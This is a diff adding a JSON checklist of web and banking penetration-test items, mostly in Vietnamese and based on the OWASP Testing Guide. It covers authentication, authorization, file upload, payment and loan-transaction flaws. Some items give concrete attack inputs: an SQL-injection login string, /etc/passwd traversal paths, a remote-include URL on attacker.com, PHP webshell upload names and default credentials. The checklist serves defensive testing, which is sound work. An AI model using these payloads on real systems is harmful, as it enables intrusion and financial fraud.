@@ -1,0 +1,443 @@
+[
+  {
+    "stt": 22,
+    "code": "OTG-IDENT-001",
+    "task": "Test Role Definitions",
+    "detail": "Kiểm tra định nghĩa role và phân quyền.\r\nCách test:\r\n1. Ghi lại tất cả role trong ứng dụng (user, editor, admin, superadmin).\r\n2. Kiểm tra mỗi role có thể làm gì (matrix permission).\r\n3. Kiểm tra role hierarchy có đúng không.\r\n4. Thử user role cao làm action của role thấp hơn có được không.\r\n5. Kiểm tra có role ẩn (debug, test) không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 23,
+    "code": "OTG-IDENT-002",
+    "task": "Test User Registration Process",
+    "detail": "Kiểm tra quy trình đăng ký user.\r\nCách test:\r\n1. Tạo user với email đã tồn tại → có báo lỗi không (enumeration)?\r\n2. Tạo user với email disposable.\r\n3. Tự động xác nhận email (auto-approve)?\r\n4. Có thể tự set role khi đăng ký? (mass assignment qua form field).\r\n5. Có rate limit trên register endpoint không?\r\n6. Kiểm tra verification token: có thể dự đoán / brute-force không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 24,
+    "code": "OTG-IDENT-003",
+    "task": "Test Account Provisioning Process",
+    "detail": "Kiểm tra quy trình cấp phát tài khoản.\r\nCách test:\r\n1. Admin tạo user mới: có thể set role tùy ý không?\r\n2. User mới có mật khẩu mặc định yếu không?\r\n3. User mới có bắt buộc đổi mật khẩu lần đầu không?\r\n4. Có thể tạo user mà không cần admin approval không?\r\n5. Kiểm tra deprovisioning: khi user bị xóa, session có còn hoạt động không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 25,
+    "code": "OTG-IDENT-004",
+    "task": "Testing for Account Enumeration and Guessable User Account",
+    "detail": "Kiểm tra khả năng enumerate tài khoản.\r\nCách test:\r\n1. Login với username đúng → 'Wrong password'.\r\n2. Login với username sai → 'User not found'.\r\n3. Nếu message khác nhau → có thể enumerate.\r\n4. Forgot password: 'Email sent if account exists' vs 'Email not found'.\r\n5. Register: 'Email already registered' vs 'Registration successful'.\r\n6. Response time khác nhau giữa user tồn tại và không tồn tại.\r\n7. Kiểm tra trong forgot password, register, resend confirmation.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 26,
+    "code": "OTG-IDENT-005",
+    "task": "Testing for Weak or unenforced username policy",
+    "detail": "Kiểm tra chính sách username.\r\nCách test:\r\n1. Kiểm tra có cho phép username trùng không?\r\n2. Kiểm tra có cho phép username: admin, administrator, root không?\r\n3. Kiểm tra có tự động suggest username dễ đoán không?\r\n4. Kiểm tra username có chứa thông tin nhạy cảm không (email, số điện thoại)?\r\n5. Kiểm tra có thể đăng nhập bằng username variant không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 27,
+    "code": "OTG-AUTHN-001",
+    "task": "Testing for Credentials Transported over an Encrypted Channel",
+    "detail": "Kiểm tra credentials có được mã hóa khi truyền tải không.\r\nCách test:\r\n1. Bật Wireshark/Burp, kiểm tra login request.\r\n2. Mật khẩu gửi dạng plaintext trong POST body? → HTTP/HTTPS?\r\n3. Có sử dụng HTTPS không? Kiểm tra TLS.\r\n4. Mật khẩu có được hash client-side trước khi gửi không?\r\n5. Kiểm tra các endpoint khác: change password, forgot password cũng dùng HTTPS.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 28,
+    "code": "OTG-AUTHN-002",
+    "task": "Testing for Default Credentials",
+    "detail": "Kiểm tra default credentials.\r\nCách test:\r\n1. Thử các credential phổ biến: admin:admin, admin:password, root:root.\r\n2. Kiểm tra default của framework: tomcat:tomcat, jboss:jboss.\r\n3. Kiểm tra admin interfaces, API gateways, Swagger UI.\r\n4. Kiểm tra trong source code / config files cho default credentials.\r\n5. Thử user/pass common trong CVE database.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 29,
+    "code": "OTG-AUTHN-003",
+    "task": "Testing for Weak Lock Out Mechanism",
+    "detail": "Kiểm tra cơ chế khóa tài khoản.\r\nCách test:\r\n1. Nhập sai password 3-5 lần → có bị khóa không?\r\n2. Sau khi khóa, có thông báo rõ ràng không?\r\n3. Thời gian khóa: 15 phút / 1 giờ / vĩnh viễn?\r\n4. Có thể unlock bằng cách nào? (email, tự động sau thời gian).\r\n5. Đếm số lần sai có reset sau khi đăng nhập đúng không?\r\n6. Có thể bypass lockout bằng cách đổi IP, User-Agent không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 30,
+    "code": "OTG-AUTHN-004",
+    "task": "Testing for Bypassing Authentication Schema",
+    "detail": "Kiểm tra khả năng bypass xác thực.\r\nCách test:\r\n1. Direct page access: http://target.com/admin/dashboard (không login).\r\n2. Path traversal bypass: /admin/..;/dashboard (IIS).\r\n3. Parameter manipulation: ?authenticated=true, ?admin=true\r\n4. Cookie manipulation: set logged_in=true, role=admin.\r\n5. SQL injection login: admin' OR '1'='1\r\n6. Try alternative authentication: API key thay vì password?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 31,
+    "code": "OTG-AUTHN-005",
+    "task": "Test remember password functionality",
+    "detail": "Kiểm tra chức năng 'Remember Me'.\r\nCách test:\r\n1. Login với 'Remember Me' → kiểm tra cookie được tạo.\r\n2. Cookie có được mã hóa không? Hay base64-encode? Giải mã.\r\n3. Cookie có thể dự đoán không? (timestamp, sequential).\r\n4. Cookie tồn tại trong bao lâu? (persistent cookie).\r\n5. Kiểm tra có thể sử dụng cookie 'Remember Me' của user khác không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 32,
+    "code": "OTG-AUTHN-006",
+    "task": "Testing for Browser Cache Weaknesses",
+    "detail": "Kiểm tra browser cache cho sensitive data.\r\nCách test:\r\n1. Sau khi login, kiểm tra response headers: Cache-Control: no-store, Pragma: no-cache.\r\n2. Kiểm tra browser history: sensitive pages có thể back sau logout?\r\n3. Kiểm tra browser cache: sensitive data có trong cache không?\r\n4. Click Back sau logout → có thấy page cũ không? (should redirect login).\r\n5. Kiểm tra autocomplete trên form mật khẩu.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 33,
+    "code": "OTG-AUTHN-007",
+    "task": "Testing for Weak Password Policy",
+    "detail": "Kiểm tra chính sách mật khẩu.\r\nCách test:\r\n1. Thử password yếu: '123456', 'password', 'abc123'.\r\n2. Thử password ngắn (1-6 ký tự).\r\n3. Thử password không có: uppercase, number, special character.\r\n4. Thử password trùng username / email.\r\n5. Kiểm tra có thể đặt password là password cũ không?\r\n6. Kiểm tra có force đổi password định kỳ không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 34,
+    "code": "OTG-AUTHN-008",
+    "task": "Testing for Weak security question/answer",
+    "detail": "Kiểm tra câu hỏi bảo mật.\r\nCách test:\r\n1. Câu hỏi có dễ đoán / dễ tìm không? (What is your pet's name? - Phổ biến).\r\n2. Câu trả lời có thể brute-force không? (2-3 từ phổ biến).\r\n3. Có thể thay đổi câu hỏi bảo mật mà không cần xác thực không?\r\n4. Câu trả lời có case-sensitive không?\r\n5. Có thể bypass security questions bằng cách reset qua email không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 35,
+    "code": "OTG-AUTHN-009",
+    "task": "Testing for weak password change or reset functionalities",
+    "detail": "Kiểm tra chức năng đổi / reset mật khẩu.\r\nCách test:\r\n1. Token reset có thể dự đoán? (timestamp, MD5, sequential).\r\n2. Token reset có expire sau khi sử dụng không? (reuse attack).\r\n3. Có thể thay đổi user khi reset password? (parameter tampering).\r\n4. Link reset có qua HTTPS không?\r\n5. Yêu cầu mật khẩu cũ khi đổi mật khẩu không?\r\n6. Reset password có logout tất cả session khác không?\r\n7. Kiểm tra Host header injection trong reset link.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 36,
+    "code": "OTG-AUTHN-010",
+    "task": "Testing for Weaker authentication in alternative channel",
+    "detail": "Kiểm tra kênh xác thực thay thế (API, mobile app, ki-ot).\r\nCách test:\r\n1. API endpoints có yêu cầu xác thực mạnh như web không?\r\n2. Mobile app có sử dụng token thay vì mật khẩu?\r\n3. API có rate limit thấp hơn web không?\r\n4. Alternative channel có tắt MFA không?\r\n5. Kiểm tra kênh web cho phép reset password qua SMS (có secure không?).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 37,
+    "code": "OTG-AUTHZ-001",
+    "task": "Testing Directory traversal/file include",
+    "detail": "Kiểm tra path traversal / file inclusion.\r\nCách test:\r\n1. Xác định parameter chứa đường dẫn file: ?file=, ?page=, ?template=\r\n2. Thử đường dẫn: ../../../etc/passwd, ..\\windows\\win.ini\r\n3. URL encoding: %2e%2e%2f, ..%252f..%252f\r\n4. Null byte injection (old PHP): ../../../etc/passwd%00.html\r\n5. Absolute path: /etc/passwd, C:\\boot.ini\r\n6. LFI → RFI: http://attacker.com/shell.txt?\r\n7. Kiểm tra PHP wrappers: php://filter/convert.base64-encode/resource=index.php",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 38,
+    "code": "OTG-AUTHZ-002",
+    "task": "Testing for Bypassing Authorization Schema",
+    "detail": "Kiểm tra bypass phân quyền.\r\nCách test:\r\n1. Thử các parameter: ?admin=true, ?role=admin, ?is_admin=1\r\n2. Thử thay đổi HTTP method: GET thay POST trên admin action.\r\n3. Thử path manipulation: ../admin/ hoặc ./admin/.\r\n4. Thử HTTP header: X-Forwarded-For: 127.0.0.1 (IP whitelist bypass).\r\n5. Thử Referer header: Referer: https://admin.target.com/\r\n6. Kiểm tra authorization dựa trên client-side data (cookie, JS).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 39,
+    "code": "OTG-AUTHZ-003",
+    "task": "Testing for Privilege Escalation",
+    "detail": "Kiểm tra leo thang đặc quyền.\r\nCách test:\r\n1. Vertical escalation: user thường → admin.\r\n2. Horizontal escalation: user A → user B (truy cập dữ liệu của nhau).\r\n3. Thử các endpoint không được phép với user thường.\r\n4. Thử thay đổi role trong request: PATCH /api/users/me {\"role\":\"admin\"}\r\n5. Kiểm tra quyền trên từng action riêng lẻ.\r\n6. Kiểm tra role cũ sau khi thay đổi role.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 40,
+    "code": "OTG-AUTHZ-004",
+    "task": "Testing for Insecure Direct Object References",
+    "detail": "Kiểm tra IDOR.\r\nCách test:\r\n1. Xác định các request chứa ID (user_id, transaction_id, order_id).\r\n2. Đổi ID thành giá trị khác (user A → user B).\r\n3. Kiểm tra response trả về dữ liệu nhạy cảm của user khác.\r\n4. Thử UUID sequence: guess UUID tăng dần?\r\n5. Thử ID không tồn tại → error message có lộ thông tin không?\r\n6. Kiểm tra cả GET, POST, PUT, DELETE request.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 75,
+    "code": "OTG-BUSLOGIC-001",
+    "task": "Test Business Logic Data Validation",
+    "detail": "Kiểm tra validation dữ liệu theo business logic.\r\nCách test:\r\n1. Xác định các rule business: số tiền tối thiểu, số lượng tối đa.\r\n2. Thử input vượt quá giới hạn.\r\n3. Thử input không hợp lệ theo business rules.\r\n4. Kiểm tra validation ở server-side, không chỉ client-side.\r\n5. Ví dụ: chuyển tiền - số tiền âm? vượt quá số dư? vượt hạn mức?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 76,
+    "code": "OTG-BUSLOGIC-002",
+    "task": "Test Ability to Forge Requests",
+    "detail": "Kiểm tra khả năng giả mạo request.\r\nCách test:\r\n1. Xác định các request quan trọng (transfer, purchase, update profile).\r\n2. Thử thay đổi tham số: amount, quantity, price, discount.\r\n3. Thử replay request (gửi lại request cũ).\r\n4. Thử bỏ qua các tham số bắt buộc.\r\n5. Kiểm tra idempotency: gửi cùng request nhiều lần → transaction duplicate?\r\n6. Kiểm tra price manipulation: thay đổi giá sản phẩm trước khi add to cart.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 77,
+    "code": "OTG-BUSLOGIC-003",
+    "task": "Test Integrity Checks",
+    "detail": "Kiểm tra tính toàn vẹn của dữ liệu.\r\nCách test:\r\n1. Kiểm tra có hash/MAC cho dữ liệu quan trọng không?\r\n2. Thử thay đổi dữ liệu mà không có hash/MAC tương ứng.\r\n3. Kiểm tra có thể thay đổi giá trị và hash/MAC không.\r\n4. Thử hash length extension attack (nếu sử dụng MD5/SHA1 + secret).\r\n5. Kiểm tra signature verification có đúng không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 78,
+    "code": "OTG-BUSLOGIC-004",
+    "task": "Test for Process Timing",
+    "detail": "Kiểm tra timing trong business process.\r\nCách test:\r\n1. Xác định các action có timing constraint: đấu giá, flash sale, booking.\r\n2. Thử gửi request sau khi hết thời gian.\r\n3. Thử race condition: gửi request đồng thời.\r\n4. Kiểm tra lock mechanism: có prevent double-spending không?\r\n5. Kiểm tra timeout giữa các bước: giỏ hàng hết hạn sau 30 phút.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 79,
+    "code": "OTG-BUSLOGIC-005",
+    "task": "Test Number of Times a Function Can Be Used Limits",
+    "detail": "Kiểm tra giới hạn số lần sử dụng chức năng.\r\nCách test:\r\n1. Xác định action có giới hạn: coupon dùng 1 lần, số lần đổi mật khẩu, số lần gửi OTP.\r\n2. Thử sử dụng coupon nhiều lần, request reset password nhiều lần.\r\n3. Thử gửi OTP unlimited lần (SMS bombing).\r\n4. Thử vượt quá giới hạn daily/monthly.\r\n5. Kiểm tra rate limit có reset đúng không?",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 80,
+    "code": "OTG-BUSLOGIC-006",
+    "task": "Testing for Circumvention of Workflows",
+    "detail": "Kiểm tra bypass workflow.\r\nCách test:\r\n1. Xác định các bước trong workflow (checkout: cart → shipping → payment → confirm).\r\n2. Thử skip bước: gửi request confirm mà không qua payment.\r\n3. Thử reorder bước: gửi payment trước khi có cart.\r\n4. Thử access step cuối trực tiếp (forced browsing).\r\n5. Kiểm tra state validation giữa các bước.\r\n6. Kiểm tra CSRF token / nonce có thay đổi giữa các bước không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 81,
+    "code": "OTG-BUSLOGIC-007",
+    "task": "Test Defenses Against Application Misuse",
+    "detail": "Kiểm tra phòng chống lạm dụng ứng dụng.\r\nCách test:\r\n1. Kiểm tra có cơ chế phát hiện bot / automation không?\r\n2. Kiểm tra có cơ chế phát hiện hành vi bất thường không?\r\n3. Thử mass action: tạo nhiều user, đặt nhiều order, vote nhiều lần.\r\n4. Kiểm tra có CAPTCHA / rate limiting cho các business-critical actions.\r\n5. Kiểm tra có giới hạn số lượng request mỗi user mỗi giờ/ngày.\r\n6. Kiểm tra fraud detection: nhiều đơn hàng đến cùng địa chỉ, cùng IP.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 82,
+    "code": "OTG-BUSLOGIC-008",
+    "task": "Test Upload of Unexpected File Types",
+    "detail": "Kiểm tra upload file type không mong muốn.\r\nCách test:\r\n1. Upload file không phải image khi hệ thống yêu cầu image.\r\n2. Thử: shell.php, shell.jsp, shell.asp, shell.aspx, shell.php5, shell.phtml.\r\n3. Thử double extension: shell.jpg.php, file.php.jpg.\r\n4. Thử null byte: shell.php%00.jpg (trong PHP < 5.3.4).\r\n5. Thử Content-Type manipulation: gửi PHP shell với Content-Type: image/jpeg.\r\n6. Thử magic byte: thêm GIF89a; vào đầu PHP shell.\r\n7. Kiểm tra extension whitelist có được enforce server-side không.",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf\r\n\r\nhttps://confluence.mbbank.com.vn/pages/viewpage.action?pageId=450686152"
+  },
+  {
+    "stt": 83,
+    "code": "OTG-BUSLOGIC-009",
+    "task": "Test Upload of Malicious Files",
+    "detail": "Kiểm tra upload file độc hại.\r\nCách test:\r\n1. Upload file chứa mã độc (webshell, virus, malware).\r\n2. Upload file có thể parse bởi server: .xml (XXE), .svg (XSS), .html (XSS).\r\n3. Upload .htaccess (Apache) → rewrite rule → file execution.\r\n4. Upload web.config (IIS) → change handler mapping.\r\n5. Upload file lớn > giới hạn → DoS.\r\n6. Upload file với cùng tên → overwrite file existing.\r\n7. Upload symlink → arbitrary file read/write.\r\n8. Upload ZIP bombs (nén file rỗng nhưng khi decompress rất lớn).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf\r\n\r\nhttps://confluence.mbbank.com.vn/pages/viewpage.action?pageId=450686152"
+  },
+  {
+    "stt": 97,
+    "code": "OTG-APIT-01",
+    "task": "Testing GraphQL",
+    "detail": "Kiểm tra bảo mật GraphQL.\r\nCách test:\r\n1. Xác định GraphQL endpoint (thường /graphql, /api/graphql, /gql).\r\n2. Kiểm tra introspection có bị tắt không: query { __schema { types { name } } }\r\n3. Nếu introspection bật → có thể dump toàn bộ schema.\r\n4. Kiểm tra query depth limit: gửi nested query sâu (depth 10+).\r\n5. Kiểm tra query cost: gửi query với alias nhiều lần (batch attack).\r\n6. Kiểm tra auth: gọi mutation không cần token.\r\n7. Kiểm tra IDOR trong GraphQL: query user(id: 2) với token user 1.\r\n8. Kiểm tra CSRF trên GraphQL mutation.\r\n9. Kiểm tra rate limiting riêng cho GraphQL.\r\n10. Kiểm tra field suggestions có bật không? (error chứa field name gợi ý).",
+    "reference": "https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf"
+  },
+  {
+    "stt": 98,
+    "code": "PAY-01",
+    "task": "Payment amount manipulation (Client-side)",
+    "detail": "Kiểm tra Số tiền gửi từ client có thể bị thay đổi? Frontend gửi amount mà không được server validate?",
+    "reference": "PCI DSS Req 6.2.4, CWE-602"
+  },
+  {
+    "stt": 99,
+    "code": "PAY-02",
+    "task": "Payment method / BIN attack",
+    "detail": "Kiểm tra thử BIN không hợp lệ, BIN của ngân hàng khác, thẻ expired?",
+    "reference": "PCI DSS Req 11.3"
+  },
+  {
+    "stt": 100,
+    "code": "PAY-03",
+    "task": "3D Secure / OTP bypass",
+    "detail": "Kiểm tra có thể bypass 3D Secure? OTP authentication có thể bị bỏ qua?",
+    "reference": "EMV 3DS 2.0, PSD2 SCA"
+  },
+  {
+    "stt": 101,
+    "code": "PAY-04",
+    "task": "Refund / Void transaction exploitation",
+    "detail": "Kiểm tra có thể refund giao dịch của người khác? Void trái phép? Phí refund manipulation?",
+    "reference": "PCI DSS, SWIFT CSP"
+  },
+  {
+    "stt": 102,
+    "code": "PAY-05",
+    "task": "Recurring billing / Subscription abuse",
+    "detail": "Kiểm tra có thể hủy subscription của người khác? Downgrade không đúng?Unlimited trial?",
+    "reference": "OWASP Business Logic"
+  },
+  {
+    "stt": 103,
+    "code": "PAY-06",
+    "task": "Cryptocurrency / Digital wallet",
+    "detail": "Kiểm tra có thể sử dụng địa chỉ ví sai? Replay giao dịch blockchain? Double-spend?",
+    "reference": "OWASP Blockchain Security"
+  },
+  {
+    "stt": 104,
+    "code": "DATA-01",
+    "task": "PII / Dữ liệu nhạy cảm trong response API",
+    "detail": "Kiểm tra số CMND/CCCD, số thẻ, mã CVV, số tài khoản trong API response không cần thiết?",
+    "reference": "PCI DSS 4.0, CWE-200"
+  },
+  {
+    "stt": 105,
+    "code": "DATA-02",
+    "task": "Số thẻ tín dụng - PCI DSS compliance",
+    "detail": "Kiểm tra số PAN, CVV, track data có được mã hóa? Có lưu CVV? Có lưu track data?",
+    "reference": "PCI DSS 4.0 Req 3, Req 4"
+  },
+  {
+    "stt": 106,
+    "code": "DATA-03",
+    "task": "Logging & Monitoring - dữ liệu nhạy cảm trong log",
+    "detail": "Kiểm tra Số thẻ, mật khẩu, OTP trong server logs? Exception stack trace leak?",
+    "reference": "PCI DSS Req 10, CWE-532"
+  },
+  {
+    "stt": 107,
+    "code": "DATA-05",
+    "task": "KYC/AML bypass",
+    "detail": "Kiểm tra có thể bypass KYC? Upload ảnh giả? Tài liệu không hợp lệ? Face recognition bypass?",
+    "reference": "FATF, AML 5th Directive"
+  },
+  {
+    "stt": 108,
+    "code": "DATA-06",
+    "task": "Device fingerprinting / Fraud detection bypass",
+    "detail": "Kiểm tra có thể change device ID, IP, user-agent để bypass fraud detection?",
+    "reference": "OWASP MASVS V8"
+  },
+  {
+    "stt": 109,
+    "code": "TXN-01",
+    "task": "Race condition - giao dịch đồng thời",
+    "detail": "Kiểm tra gửi nhiều request rút tiền / chuyển tiền đồng thời, vượt quá số dư hiện tại (TOCTOU)",
+    "reference": "OWASP ASVS V11, CWE-362"
+  },
+  {
+    "stt": 110,
+    "code": "TXN-02",
+    "task": "Race condition - sử dụng coupon/voucher 1 lần",
+    "detail": "Kiểm tra gửi đồng thời nhiều request cùng 1 mã giảm giá, sử dụng nhiều lần",
+    "reference": "CWE-362, PortSwigger race condition lab"
+  },
+  {
+    "stt": 111,
+    "code": "TXN-03",
+    "task": "Âm lượng giao dịch (Negative amount)",
+    "detail": "Kiểm tra chuyển khoản với số tiền âm → tăng số dư tài khoản?",
+    "reference": "CWE-1284, OWASP Business Logic"
+  },
+  {
+    "stt": 112,
+    "code": "TXN-04",
+    "task": "Phí giao dịch - Fee bypass",
+    "detail": "Kiểm tra có thể sửa tham số fee/commission? Bỏ qua fee bằng cách không gửi tham số fee?",
+    "reference": "OWASP Web Parameter Tampering"
+  },
+  {
+    "stt": 113,
+    "code": "TXN-05",
+    "task": "Làm tròn số tiền (Rounding/Salami attack)",
+    "detail": "Khai thác lỗi làm tròn số thập phân để tích lũy tiền lẻ từ nhiều giao dịch",
+    "reference": "CWE-682, SWIFT CSP"
+  },
+  {
+    "stt": 114,
+    "code": "TXN-06",
+    "task": "Tỷ giá hối đoái (Exchange rate manipulation)",
+    "detail": "Tỷ giá có bị khóa tại thời điểm giao dịch? Có thể manipulate tỷ giá giữa request và confirm?",
+    "reference": "PCI DSS 3.x, CWE-840"
+  },
+  {
+    "stt": 115,
+    "code": "TXN-07",
+    "task": "Idempotency key - Replay attack",
+    "detail": "Idempotency key có được yêu cầu? Có thể replay request với cùng key? Key có thể dự đoán?",
+    "reference": "Stripe API design, CWE-799"
+  },
+  {
+    "stt": 116,
+    "code": "TXN-08",
+    "task": "Bỏ qua bước trong quy trình (Skip workflow)",
+    "detail": "Có thể bỏ qua các bước xác nhận, review, approval? Ví dụ: skip OTP, skip pending approval",
+    "reference": "OWASP Business Logic Flaws"
+  },
+  {
+    "stt": 117,
+    "code": "TXN-09",
+    "task": "Thay đổi thông tin người thụ hưởng (Beneficiary)",
+    "detail": "Có thể thay đổi tài khoản thụ hưởng sau khi đã xác thực? Man-in-the-middle trên request?",
+    "reference": "OWASP Web Parameter Tampering"
+  },
+  {
+    "stt": 118,
+    "code": "TXN-10",
+    "task": "Hủy giao dịch / Refund exploitation",
+    "detail": "Refund có thể được trigger nhiều lần cho cùng 1 giao dịch? Refund nhiều hơn số tiền gốc?",
+    "reference": "CWE-841, SWIFT CSP"
+  },
+  {
+    "stt": 119,
+    "code": "TXN-11",
+    "task": "Giới hạn giao dịch (Transaction limits) bypass",
+    "detail": "Có thể bypass hạn mức giao dịch bằng cách chia nhỏ? Vượt hạn mức qua API?",
+    "reference": "PCI DSS 4.0 Req 6.2.4"
+  },
+  {
+    "stt": 120,
+    "code": "TXN-12",
+    "task": "Manipulate currency code / Loại tiền tệ",
+    "detail": "Có thể thay đổi currency code (VND→USD) để khai thác chênh lệch?",
+    "reference": "CWE-840, CWE-1284"
+  },
+  {
+    "stt": 121,
+    "code": "TXN-13",
+    "task": "Giao dịch vượt quá số dư (Overdraft bypass)",
+    "detail": "Có thể tạo giao dịch vượt quá số dư được phép? Negative balance exploitation?",
+    "reference": "CWE-242, OWASP ASVS V11"
+  },
+  {
+    "stt": 122,
+    "code": "TXN-14",
+    "task": "Multi-currency / Cross-border logic",
+    "detail": "Phí chuyển đổi ngoại tệ bị sai? SWIFT/BIC validation bypass? Thông tin quốc gia không khớp?",
+    "reference": "FATF Recommendations, SWIFT CSP"
+  },
+  {
+    "stt": 123,
+    "code": "TXN-15",
+    "task": "Standing order / Auto debit exploitation",
+    "detail": "Có thể tạo standing order không giới hạn? Sửa số tiền định kỳ sau khi xác thực?",
+    "reference": "OWASP Business Logic"
+  },
+  {
+    "stt": 124,
+    "code": "TXN-16",
+    "task": "Cashback / Reward program abuse",
+    "detail": "Cashback có thể bị lạm dụng? Tạo giao dịch giả để nhận reward?",
+    "reference": "OWASP Business Logic"
+  },
+  {
+    "stt": 125,
+    "code": "TXN-17",
+    "task": "Kiểm tra account list được phép giao dịch (tài khoản nguồn tương ứng với khách  hàng)",
+    "detail": "Kiểm tra nhằm đảm bảo chỉ những tài khoản của khách hàng mới được chọn làm tài khoản nguồn cho các giao dịch ngân hàng;",
+    "reference": ""
+  },
+  {
+    "stt": 126,
+    "code": "TXN-18",
+    "task": "Tạo khoản vay STK (của người khác) không phải STK của khách hàng",
+    "detail": "Kiểm tra khoản vay được thế chấp bằng STK của người khác chứ không phải của khách hàng (làm việc với nghiệp vụ để bám sát tính chất sản phẩm)",
+    "reference": ""
+  },
+  {
+    "stt": 127,
+    "code": "TXN-19",
+    "task": "Tạo khoản vay STK (không có trên hệ thống hoặc STK đã được tất toán / sổ đã được block phục vụ cho các khoản vay hoặc loại giao dịch khác (như bị phong tỏa, ...)) không phải STK của khách hàng",
+    "detail": "Tạo khoản vay STK (không có trên hệ thống hoặc STK đã được tất toán / sổ đã được block phục vụ cho các khoản vay hoặc loại giao dịch khác (như bị phong tỏa, ...)) không phải STK của khách hàng",
+    "reference": ""
+  },
+  {
+    "stt": 128,
+    "code": "TXN-20",
+    "task": "Tạo khoản vay với số tiền vượt quá số tiền làm STK hoặc số tiền âm, ....",
+    "detail": "Tạo khoản vay với số tiền vượt quá số tiền làm STK hoặc số tiền âm, ....",
+    "reference": ""
+  },
+  {
+    "stt": 129,
+    "code": "TXN-21",
+    "task": "Check CIC chưa ? - ...",
+    "detail": "Kiểm tra sang CIC hoặc tổ chức uy tín khác nhằm đảm bảo khách hàng không nằm trong nhóm nợ xấu;",
+    "reference": ""
+  },
+  {
+    "stt": 130,
+    "code": "TXN-22",
+    "task": "Giao dịch có được check qua hệ thống AML (Anti-Money Laundering - Chống rửa tiền)",
+    "detail": "Giao dịch có được check qua hệ thống AML (Anti-Money Laundering - Chống rửa tiền)",
+    "reference": ""
+  },
+  {
+    "stt": 131,
+    "code": "MFA-MB-01",
+    "task": "Kiểm tra MFA/Xác thực mạnh",
+    "detail": "Kiểm tra hệ thống quản tri đã có MFA chưa\r\nKiểm tra hệ thống đó thuộc cấp độ nào? Đã có biện pháp kiểm soát truy cập MFA chưa.\r\nTheo thông tin MB đã ban hành",
+    "reference": "Bắt buộc đối với các hệ thống từ CĐ 3 trở lên; Các hệ thống liên quan đến quản trị vận hành; Các trang quản trị nghiệp vụ; Hệ thống truy cập từ Internet\r\n\\\\data.mbbank.com.vn\\KHỐI CÔNG NGHỆ THÔNG TIN\\TAI LIEU CHUNG KHOI CNTT\\10. Tai lieu chat luong Khoi CNTT\\4. Thong bao\\15487.TB-CNTT_HD thiet lap MFA cho he thong"
+  }
+]
